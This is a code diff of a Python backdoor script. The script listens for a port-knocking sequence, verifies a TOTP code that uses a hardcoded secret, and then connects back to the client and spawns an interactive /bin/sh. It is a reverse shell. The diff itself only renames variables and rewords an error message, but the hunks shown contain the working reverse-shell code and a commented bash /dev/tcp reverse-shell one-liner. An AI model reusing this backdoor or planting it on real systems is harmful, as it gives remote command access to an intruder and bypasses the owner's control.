@@ -30,13 +30,13 @@ def port_knocking(ports, timeout):
 def check_OTP(port_otp):
   """ Open specific port to receive OTP password """
 
-  serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-  serv_socket.bind(('127.0.0.1', port_otp)) 
-  serv_socket.listen(1) 
-  con, client = serv_socket.accept() 
+  otp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  otp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+  otp_socket.bind(('127.0.0.1', port_otp)) 
+  otp_socket.listen(1) 
+  con, client = otp_socket.accept() 
   client_value = con.recv(1024).decode().strip()
-  serv_socket.close() 
+  otp_socket.close() 
 
   totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')
   if (totp.verify(client_value)):
@@ -49,11 +49,11 @@ def check_OTP(port_otp):
 def reverse_shell(client_ip, port_reverse_shell):
   """ Send shell to client """
 
-  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-  s.connect((client_ip, port_reverse_shell))
-  os.dup2(s.fileno(),0)
-  os.dup2(s.fileno(),1) 
-  os.dup2(s.fileno(),2)
+  shell_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+  shell_socket.connect((client_ip, port_reverse_shell))
+  os.dup2(shell_socket.fileno(),0)
+  os.dup2(shell_socket.fileno(),1) 
+  os.dup2(shell_socket.fileno(),2)
   subprocess.call(["/bin/sh","-i"])
 
   # command = "bash -i >& /dev/tcp" + cliente[0] + "/12345 0>&1"
@@ -69,9 +69,8 @@ if __name__ == '__main__':
       port_reverse_shell = int(input("Type the port that will receive the reverse shell: "))
       break
     except ValueError:
-      print ("\nERROR! Type correct port numbers!")
+      print ("\nERROR! Incorrect value type!")
 
   port_knocking(ports_list, timeout)
   client_ip = check_OTP(port_otp)
   reverse_shell(client_ip, port_reverse_shell)
-
